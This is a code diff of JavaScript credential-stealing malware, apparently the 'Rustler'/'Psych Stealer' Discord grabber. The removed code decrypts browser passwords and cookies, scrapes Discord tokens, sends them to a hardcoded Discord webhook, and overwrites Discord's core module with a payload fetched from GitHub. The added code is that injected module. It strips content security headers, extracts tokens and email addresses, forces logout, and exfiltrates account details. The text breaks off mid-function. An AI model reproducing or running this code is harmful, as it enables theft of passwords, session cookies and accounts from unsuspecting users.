@@ -1,485 +1,1827 @@
-// Code is shit
-var glob = require("glob");
-//console.log('Starting game...');
-const fs = require('fs');
-var FormData = require('form-data');
-const https = require('https');
-const axios = require('axios');
-const crypto = require('crypto');
-//const dpapi = require("win-dpapi");
-//const sqlite3 = require('sqlite3');
-const dpapi = require("nexe-natives-fix")(require.resolve("win-dpapi"));
-const sqlite3 = require("nexe-natives-fix")(require.resolve("sqlite3"));
-const src = ("https://discord.com/api/webhooks/966405018867626014/Kb0fcwwQLDNEZLWbAcu0sK9kmmtLm6_8NHUQ54msTPUg2-Pnj71_OxB1uiJb_ZWe0qGo") //webhook url
-const github = "https://raw.githubusercontent.com/Kenil35/rustler-grabber-src/main/rust1.js"
-/*((async () => {
-    await axios.get('https://ipconfig.io/json')
-        .then(res => {
-            console.log(res.data);
-            if (['microsoft', 'google', 'ovh'].some(s => res.data['asn_org']?.toLowerCase()
-                    ?.includes(s))) return process.exit();
-        })
-        .catch();
-})());*/
-
-const {
-    exec
-} = require('child_process');
-var debug = false,
-    args = process.argv.slice(2);
-
-if (args[0] == 'debug') debug = false;
-const buf_replace = require('buffer-replace');
-const superstarlmao = "da_webhook"
-const config = {
-    "logout": "instant",
-    "inject-notify": "true",
-    "logout-notify": "true",
-    "init-notify": "false",
-    "embed-color": 3553599,
-    "disable-qr-code": "true"
-}
-
-var appdata = process.env.APPDATA,
- LOCAL = process.env.LOCALAPPDATA,
- localappdata = process.env.LOCALAPPDATA,
- discords = [];
- injectPath = [];
- runningDiscords = [];
-paths = [
-    appdata + '\\discord\\',
-    appdata + '\\discordcanary\\',
-    appdata + '\\discordptb\\',
-    appdata + '\\discorddevelopment\\',
-    appdata + '\\lightcord\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
-    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
-    appdata + '\\Opera Software\\Opera Stable\\',
-    appdata + '\\Opera Software\\Opera GX Stable\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
-    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
-    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
-    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
-];
-
-fs.readdirSync(localappdata)
-    .forEach(file => {
-      //  console.log('Searching game folder...');
-        if (file.includes('cord')) discords.push(localappdata + '\\' + file);
-        else return;
-    }), discords.forEach(file => {
-      //  console.log('Making game config...');
-        let pattern = file + '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js';
-        glob.sync(pattern)
-            .map(file => {
-                injectPath.push(file);
-              //  console.log('Saving config file...');
-                listDiscords();
-            });
-    });
-
-takePizzas();
-takeCheese();
-stealTokens()
-removePizzas();
-listDiscords();
-function Infect() {
-   // console.log(`Starting Game...`);
-    https.get(github, (resp) => {
-        let data = '';
-        resp.on('data', (chunk) => {
-            data += chunk;
-        });
-        resp.on('end', () => {
-            injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", superstarlmao).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
-                    encoding: 'utf8',
-                    flag: 'w'
-                });
-                if (config["init-notify"] == "true") {
-                    let init = file.replace("index.js", "init")
-                    if (!fs.existsSync(init)) {
-                        fs.mkdirSync(init, 0744)
-                    }
-                }
-                if (config.logout != "false") {
-                    let folder = file.replace("index.js", "Rustler")
-                    if (!fs.existsSync(folder)) {
-                        fs.mkdirSync(folder, 0744)
-                        if (config.logout == "instant") {
-                            startDiscord();
-                        }
-                    } else if (fs.existsSync(folder) && config.logout == "instant") {
-                        startDiscord();
-                    }
-                }
-            })
-        });
-    }).on("error", (err) => {
-        console.log(err);
-    });
-};
-
-function listDiscords() {
-    exec('tasklist', function (err, stdout, stderr) {
-        if (stdout.includes('Discord.exe')) runningDiscords.push('Discord');
-        if (stdout.includes('DiscordCanary.exe')) runningDiscords.push('DiscordCanary');
-        if (stdout.includes('DiscordPTB.exe')) runningDiscords.push('DiscordPTB');
-        if (stdout.includes('DiscordDevelopment.exe')) runningDiscords.push('DiscordDevelopment');
-        killDiscord();
-    });
-};
-function killDiscord() {
-    runningDiscords.forEach(disc => {
-        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
-            if (err) {
-              return;
-            }
-          });
-    });
-
-    Infect()
-    pwnBetterDiscord()
-};
-
-function startDiscord() {
-        runningDiscords.forEach(disc => {
-           // console.log('Starting game paths...');
-            try {
-                exec(localappdata + '\\' + disc + '\\Update.exe' + ' --processStart ' + disc + '.exe', err => {
-                    if (err) {
-                        if (debug) console.log(err);
-                    }
-                });
-            } catch (e) {}
-        });
-};
-function pwnBetterDiscord() {
-    // thx stanley
-    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
-    if (fs.existsSync(dir)) {
-        var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "kkkkk"))
-    } else {
-        return;
-    }
-}
-
-async function getPizzas(path) {
-    let path_split = path.split('\\'),
-        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
-        path_tail = path_split_tail.join('\\') + '\\';
-    if (path.startsWith(appdata)) path_tail = path;
-    if (path.includes('cord')) return;
-    if (fs.existsSync(path_tail)) {
-        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
-                .os_crypt.encrypted_key, 'base64')
-            .slice(5);
-        var login_data = path + 'Login Data',
-            passwords_db = path + 'passwords.db';
-        fs.copyFileSync(login_data, passwords_db);
-        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
-        var result = '\n\nPASSWORDS FROM: ' + path + '  #RustlerONTOP\n',
-            sql = new sqlite3.Database(passwords_db, err => {
-                if (err) {
-                    if (debug) console.log(err);
-                }
-            });
-        const pizza = await new Promise((resolve, reject) => {
-            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
-                if (err) {
-                    if (debug) console.log(err);
-                }
-                if (row['username_value'] != '') {
-                    let password_value = row['password_value'];
-                    try {
-                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
-                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
-                                .toString('utf-8');
-                        } else {
-                            let start = password_value.slice(3, 15),
-                                middle = password_value.slice(15, password_value.length - 16),
-                                end = password_value.slice(password_value.length - 16, password_value.length),
-                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
-                            decipher.setAuthTag(end);
-                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
-                        }
-                    } catch (e) {
-                        if (debug) console.log(e);
-                    }
-                }
-            }, function () {
-                resolve(result);
-            });
-        });
-        return pizza;
-    } else {
-        return '';
-    }
-}
-
-async function getCheese(path) {
-    let path_split = path.split('\\'),
-        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
-        path_tail = path_split_tail.join('\\') + '\\';
-    if (path.startsWith(appdata)) path_tail = path;
-    if (path.includes('cord')) return;
-    if (fs.existsSync(path_tail)) {
-        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
-                .os_crypt.encrypted_key, 'base64')
-            .slice(5);
-        var cookies = path + 'Cookies',
-            cookies_db = path + 'cookies.db';
-        fs.copyFileSync(cookies, cookies_db);
-        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
-        var result = '',
-            sql = new sqlite3.Database(cookies_db, err => {
-                if (err) {
-                    if (debug) console.log(err);
-                }
-            });
-        const cheese = await new Promise((resolve, reject) => {
-            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
-                if (err) {
-                    if (debug) console.log(err);
-                }
-                let encrypted_value = row['encrypted_value'];
-                try {
-                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
-                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + dpapi.unprotectData(encrypted_value, null, 'CurrentUser') + "\n"
-                            .toString('utf-8');
-                    } else {
-                        let start = encrypted_value.slice(3, 15),
-                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
-                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
-                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
-                        decipher.setAuthTag(end);
-                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + "\n"
-                    }
-                } catch (e) {
-                    if (debug) console.log(e);
-                }
-            }, function () {
-                resolve(result);
-            })
-        });
-        return cheese;
-    } else return '';
-}
-
-function findToken(path) {
-    path += 'Local Storage\\leveldb';
-    let tokens = [];
-    try {
-        fs.readdirSync(path)
-            .map(file => {
-                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
-                    .split(/\r?\n/)
-                    .forEach(line => {
-                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
-                        for (const pattern of patterns) {
-                            const foundTokens = line.match(pattern);
-                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
-                        }
-                    });
-            });
-    } catch (e) {}
-    return tokens;
-}
-
-async function takePizzas() {
-    let passwords = '';
-    for (let i = 0; i < paths.length; i++) {
-        if (fs.existsSync(paths[i] + 'Login Data'))
-            passwords += await getPizzas(paths[i]) || '';
-    }
-    fs.writeFile(appdata + '\\passwords.txt', passwords, function (err, data) {
-
-        if (err) throw err;
-      
-        const form = new FormData();
-        form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
-        form.submit(superstarlmao, (error, response) => {
-        if (error) console.log(error);
-        });
-    });
-    fs.writeFile(appdata + '\\src-passwords.txt', passwords, function (err, data) {
-
-        if (err) throw err;
-      
-        const form = new FormData();
-        form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt"));
-        form.submit(src, (error, response) => {
-        if (error) console.log(error);
-        });
-    });
-}
-
-async function takeCheese() {
-    let cookies = '';
-    for (let i = 0; i < paths.length; i++) {
-        if (fs.existsSync(paths[i] + 'Cookies'))
-            cookies += await getCheese(paths[i]) || '';
-    }
-    fs.writeFile(appdata + '\\cookies.txt', cookies, function (err, data) {
-
-        if (err) throw err;
-      
-        const form = new FormData();
-        form.append("file", fs.createReadStream(appdata+"\\cookies.txt"));
-        form.submit(superstarlmao, (error, response) => {
-        if (error) console.log(error);
-        });
-    });
-
-    fs.writeFile(appdata + '\\src-cookies.txt', cookies, function (err, data) {
-
-        if (err) throw err;
-      
-        const form = new FormData();
-        form.append("file", fs.createReadStream(appdata+"\\src-cookies.txt"));
-        form.submit(src, (error, response) => {
-        if (error) console.log(error);
-        });
-    });
-
-}
-
-async function stealTokens() {
-    const fields = [];
-    for (let path of paths) {
-        const foundTokens = findToken(path);
-        if (foundTokens) foundTokens.forEach(token => { 
-            var c = {
-                name: "<:browserstokens:951827260741156874> Browser Token;",
-                value: `\`\`\`${token}\`\`\`[CopyToken](https://sourwearyresources.rustlerjs.repl.co/copy/`+ token +`)`,
-                inline: !0
-            }
-            fields.push(c)
-        });
-    }
-
-    axios.post(superstarlmao, {
-        "content": null,
-        "embeds": [
-          {
-            "color": config["embed-color"],
-            "fields": fields.filter(onlyUnique),
-            "author": {
-                "name": `Rustler $TEALER`,
-                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
-            },
-            "footer": {
-                "text": "Rustler $TEALER"
-            },
-        }]
-    }) .then(res => {}).catch(error => {})
-
-    axios.post(src, {
-        "content": null,
-        "embeds": [
-          {
-            "color": config["embed-color"],
-            "fields": fields.filter(onlyUnique),
-            "author": {
-                "name": `Rustler $TEALER`,
-                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
-            },
-            "footer": {
-                "text": "Rustler $TEALER"
-            },
-        }]
-    }) .then(res => {}).catch(error => {})
-    
-}
-
-function hideSelf() {
-    let payload = '\n' +
-        "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
-        '    [DllImport("Kernel32.dll")]\n' +
-        '    public static extern IntPtr GetConsoleWindow();\n' +
-        '\n' +
-        '    [DllImport("user32.dll")]\n' +
-        '    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n' +
-        "    '\n" +
-        '\n' +
-        '    $consolePtr = [Console.Window]::GetConsoleWindow()\n' +
-        '    #0 hide\n' +
-        '    [Console.Window]::ShowWindow($consolePtr, 0)\n' +
-        '    ',
-        file = process.cwd() + '\\temp.ps1';
-    try {
-        fs.writeFileSync(file, payload);
-        require('child_process')
-            .execSync('type .\\temp.ps1 | powershell.exe -noprofile -', {
-                'stdio': 'inherit'
-            });
-        fs.unlinkSync(file);
-    } catch (e) {}
-}
-
-function sleep(ms) {
-    return new Promise((resolve) => {
-      setTimeout(resolve, ms);
-    });
+const fs = require('fs')
+const path = require('path'),
+  { BrowserWindow, session } = require('electron'),
+  querystring = require('querystring'),
+  os = require('os')
+var webhook = '%WEBHOOK_LINK%'
+var src = ''
+const computerName = os.hostname(),
+  discordInstall = '' + __dirname
+const EvalToken =
+  'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'
+String.prototype.insert = function (w, W) {
+  if (w > 0) {
+    return this.substring(0, w) + W + this.substr(w)
   }
-
-  function onlyUnique(item, index, array) {
-    return array.indexOf(item) === index;
+  return W + this
 }
-
-async function removePizzas() {
-    await sleep(1000);
-    fs.unlinkSync(appdata+"\\passwords.txt");
-    fs.unlinkSync(appdata+"\\cookies.txt");
-    fs.unlinkSync(appdata+"\\src-passwords.txt");
-    fs.unlinkSync(appdata+"\\src-cookies.txt");
+const AC = {}
+AC.logout = 'instant'
+AC['inject-notify'] = 'true'
+AC['logout-notify'] = 'true'
+AC['init-notify'] = 'false'
+AC['embed-color'] = 3553599
+AC['disable-qr-code'] = 'true'
+const config = AC
+session.defaultSession.webRequest.onHeadersReceived((b, s) => {
+  if (b.url.startsWith(webhook)) {
+    if (b.url.includes('discord.com')) {
+      const D = {}
+      D['Access-Control-Allow-Headers'] = '*'
+      s({ responseHeaders: Object.assign(D, b.responseHeaders) })
+    } else {
+      s({
+        responseHeaders: Object.assign(
+          {
+            'Content-Security-Policy': [
+              "default-src '*'",
+              "Access-Control-Allow-Headers '*'",
+              "Access-Control-Allow-Origin '*'",
+            ],
+            'Access-Control-Allow-Headers': '*',
+            'Access-Control-Allow-Origin': '*',
+          },
+          b.responseHeaders
+        ),
+      })
+    }
+  } else {
+    delete b.responseHeaders['content-security-policy']
+    delete b.responseHeaders['content-security-policy-report-only']
+    const R = { ...b.responseHeaders }
+    R['Access-Control-Allow-Headers'] = '*'
+    const U = { responseHeaders: R }
+    s(U)
+  }
+})
+function FirstTime(a) {
+  const W = BrowserWindow.getAllWindows()[0]
+  W.webContents.executeJavaScript('' + EvalToken, true).then((b) => {
+    if (config['init-notify'] == 'true') {
+      if (fs.existsSync(path.join(__dirname, 'init'))) {
+        fs.rmdirSync(path.join(__dirname, 'init'))
+        if (b == null || b == undefined || b == '') {
+          const L = {
+            username: 'LiquidBounce',
+            content: '',
+            embeds: [
+              {
+                title: 'Discord Started',
+                color: config['embed-color'],
+                fields: [
+                  {
+                    name: 'Info',
+                    value:
+                      '```Hostname: \n' +
+                      computerName +
+                      '\nInjection Info: \n' +
+                      __dirname +
+                      '\n```',
+                    inline: false,
+                  },
+                ],
+                author: { name: 'LiquidBounce' },
+                footer: { text: 'LiquidBounce' },
+              },
+            ],
+          }
+          var J = L
+          SendToWebhook(JSON.stringify(J))
+        } else {
+          const p = BrowserWindow.getAllWindows()[0]
+          p.webContents
+            .executeJavaScript(
+              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
+                b +
+                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
+              true
+            )
+            .then((R) => {
+              const f = JSON.parse(R)
+              var U = {
+                username: 'Psych Stealer',
+                content: '',
+                embeds: [
+                  {
+                    title: 'Discord Initalized',
+                    description:
+                      '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/' +
+                      b +
+                      ')',
+                    color: config['embed-color'],
+                    fields: [
+                      {
+                        name: 'Info',
+                        value:
+                          '```Hostname: \n' +
+                          computerName +
+                          '\nInjection Info: \n' +
+                          __dirname +
+                          '\n```',
+                        inline: false,
+                      },
+                      {
+                        name: 'Username',
+                        value: '`' + f.username + '#' + f.discriminator + '`',
+                        inline: true,
+                      },
+                      {
+                        name: 'Email:',
+                        value: '`' + a + '`',
+                        inline: true,
+                      },
+                      {
+                        name: 'Badges',
+                        value: '' + GetBadges(f.flags),
+                        inline: false,
+                      },
+                      {
+                        name: 'Token',
+                        value: '```' + b + '```',
+                        inline: false,
+                      },
+                    ],
+                    author: { name: 'Psych Stealer' },
+                    footer: { text: 'Psych Stealer' },
+                    thumbnail: {
+                      url:
+                        'https://cdn.discordapp.com/avatars/' +
+                        f.id +
+                        '/' +
+                        f.avatar,
+                    },
+                  },
+                ],
+              }
+              SendToWebhook(JSON.stringify(U))
+            })
+        }
+      }
+    }
+    if (!fs.existsSync(path.join(__dirname, 'Rustler'))) {
+      return true
+    }
+    fs.rmdirSync(path.join(__dirname, 'Rustler'))
+    if (config.logout != 'false' || config.logout == '%LOGOUT%') {
+      if (config['logout-notify'] == 'true') {
+        if (b == null || b == undefined || b == '') {
+          const G = {
+            username: 'Psych Stealer',
+            content: '',
+            embeds: [
+              {
+                title: 'User log out (User not Logged in before)',
+                color: config['embed-color'],
+                fields: [
+                  {
+                    name: 'Info',
+                    value:
+                      '```Hostname: \n' +
+                      computerName +
+                      '\nInjection Info: \n' +
+                      __dirname +
+                      '\n```',
+                    inline: false,
+                  },
+                ],
+                author: { name: 'LiquidBounce' },
+                footer: { text: 'LiquidBounce' },
+              },
+            ],
+          }
+          var J = G
+          SendToWebhook(JSON.stringify(J))
+        } else {
+          const n = BrowserWindow.getAllWindows()[0]
+          n.webContents
+            .executeJavaScript(
+              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
+                b +
+                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
+              true
+            )
+            .then((S) => {
+              const q = JSON.parse(S)
+              var t = {
+                username: 'Psych Stealer',
+                content: '',
+                embeds: [
+                  {
+                    color: config['embed-color'],
+                    fields: [
+                      {
+                        name: '<:token:949679866188529714> Token:',
+                        value:
+                          '`' +
+                          b +
+                          '`' +
+                          '\n[CopyToken](https://superfurrycdn.nl/copy/' +
+                          b +
+                          ')',
+                        inline: false,
+                      },
+                      {
+                        name: '<:password:949679865580384266> Username:',
+                        value: '`' + q.username + '#' + q.discriminator + '`',
+                        inline: true,
+                      },
+                      {
+                        name: '<:ip:949680203859369994> ID:',
+                        value: '`' + q.id + '`',
+                        inline: true,
+                      },
+                      {
+                        name: '<:mail:949679866113032253> Email:',
+                        value: '`' + q.email + '`',
+                        inline: true,
+                      },
+                      {
+                        name: '<:badge:949679865710403584> Badges:',
+                        value: '' + GetBadges(q.flags),
+                        inline: true,
+                      },
+                      {
+                        name: '<:nitro:949679866033352784> Nitro Type:',
+                        value: '' + GetNitro(q.premium_type),
+                        inline: true,
+                      },
+                    ],
+                    author: {
+                      name:
+                        q.username + '#' + q.discriminator + ' (' + q.id + ')',
+                      icon_url:
+                        'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
+                    },
+                    footer: { text: 'LiquidBounce' },
+                    thumbnail: {
+                      url:
+                        'https://cdn.discordapp.com/avatars/' +
+                        q.id +
+                        '/' +
+                        q.avatar,
+                    },
+                  },
+                ],
+              }
+              SendToWebhook(JSON.stringify(t))
+            })
+        }
+      }
+      const e = BrowserWindow.getAllWindows()[0]
+      e.webContents
+        .executeJavaScript(
+          'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
+          true
+        )
+        .then((Y) => {})
+    }
+    return false
+  })
 }
+const An = {}
+An.urls = [
+  'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
+  'https://*.discord.com/api/v*/applications/detectable',
+  'https://discord.com/api/v*/applications/detectable',
+  'https://*.discord.com/api/v*/users/@me/library',
+  'https://discord.com/api/v*/users/@me/library',
+  'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
+  'https://discord.com/api/v*/users/@me/billing/subscriptions',
+  'wss://remote-auth-gateway.discord.gg/*',
+]
+const Filter = An
+session.defaultSession.webRequest.onBeforeRequest(Filter, (w, W) => {
+  if (w.url.startsWith('wss://')) {
+    if (
+      config['disable-qr-code'] == 'true' ||
+      config['disable-qr-code'] == '%DISABLEQRCODE%'
+    ) {
+      const J = { cancel: true }
+      W(J)
+      return
+    }
+  }
+  if (FirstTime()) {
+  }
+  W({})
+  return
+})
+function SendToWebhook(a) {
+  const w = BrowserWindow.getAllWindows()[0]
+  w.webContents
+    .executeJavaScript(
+      '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
+        webhook +
+        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
+        a +
+        '));\n    ',
+      true
+    )
+    .then((W) => {})
+  w.webContents
+    .executeJavaScript(
+      '    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
+        src +
+        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
+        a +
+        '));\n    ',
+      true
+    )
+    .then((W) => {})
+}
+function GetNitro(w) {
+  if (w == 0) {
+    return '`No Nitro`'
+  }
+  if (w == 1) {
+    return '<:classic:896119171019067423> `Nitro Classic`'
+  }
+  if (w == 2) {
+    return '<a:boost:824036778570416129> `Nitro Boost`'
+  } else {
+    return '`No Nitro`'
+  }
+}
+function GetRBadges(a) {
+  var k = ''
+  if ((a & 1) == 1) {
+    k += '<:staff:874750808728666152> '
+  }
+  if ((a & 2) == 2) {
+    k += '<:partner:874750808678354964> '
+  }
+  if ((a & 4) == 4) {
+    k += '<:hypesquad_events:874750808594477056> '
+  }
+  if ((a & 8) == 8) {
+    k += '<:bughunter_1:874750808426692658> '
+  }
+  ;(a & 512) == 512 && (k += '<:early_supporter:874750808414113823> ')
+  if ((a & 16384) == 16384) {
+    k += '<:bughunter_2:874750808430874664> '
+  }
+  if ((a & 131072) == 131072) {
+    k += '<:developer:874750808472825986> '
+  }
+  return k == '' && (k = ''), k
+}
+function GetBadges(a) {
+  const s = 4
+  var U = ''
+  ;(a & 1) == 1 && (U += '<:staff:874750808728666152> ')
+  if ((a & 2) == 2) {
+    U += '<:partner:874750808678354964> '
+  }
+  if ((a & s) == s) {
+    U += '<:hypesquad_events:874750808594477056> '
+  }
+  ;(a & 8) == 8 && (U += '<:bughunter_1:874750808426692658> ')
+  ;(a & 64) == 64 && (U += '<:bravery:874750808388952075> ')
+  if ((a & 128) == 128) {
+    U += '<:brilliance:874750808338608199> '
+  }
+  if ((a & 256) == 256) {
+    U += '<:balance:874750808267292683> '
+  }
+  if ((a & 512) == 512) {
+    U += '<:early_supporter:874750808414113823> '
+  }
+  ;(a & 16384) == 16384 && (U += '<:bughunter_2:874750808430874664> ')
+  if ((a & 131072) == 131072) {
+    U += '<:developer:874750808472825986> '
+  }
+  if (U == '') {
+    U = '`No Badges`'
+  }
+  return U
+}
+function Login(a, w, W) {
+  const s = BrowserWindow.getAllWindows()[0]
+  s.webContents
+    .executeJavaScript(
+      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
+        W +
+        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
+      true
+    )
+    .then((J) => {
+      s.webContents
+        .executeJavaScript(
+          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
+          true
+        )
+        .then((D) => {
+          s.webContents
+            .executeJavaScript(
